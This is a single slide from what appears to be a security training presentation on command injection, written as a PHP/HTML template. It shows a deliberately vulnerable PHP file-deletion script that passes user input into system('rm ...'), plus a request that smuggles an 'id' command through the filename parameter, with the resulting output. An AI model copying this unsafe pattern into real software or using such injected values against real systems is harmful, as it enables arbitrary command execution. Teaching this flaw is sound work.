<section class="slide" id="<?= getSlideId(__FILE__) ?>">
    <div>
        <span class="chapter">Chapter 3</span>
        <h2>Command Injection</h2>

        <?php echo code('php', '
print("Please specify the name of the file to delete<br>");
$file = $_GET[\'filename\'];
system("rm $file");
        ', true, 'no-margin-bottom fs-65') ?>

        <strong>Request:</strong>
        <?php echo code('html', 'http://127.0.0.1/delete.php?filename=bob.txt;id', true, 'no-margin-bottom fs-65') ?>

        <strong>Response:</strong>
        <?php echo code('html', 'Please specify the name of the file to delete
uid=33(www-data) gid=33(www-data) groups=33(www-data)', true, 'no-margin-bottom fs-65') ?>

    </div>
</section>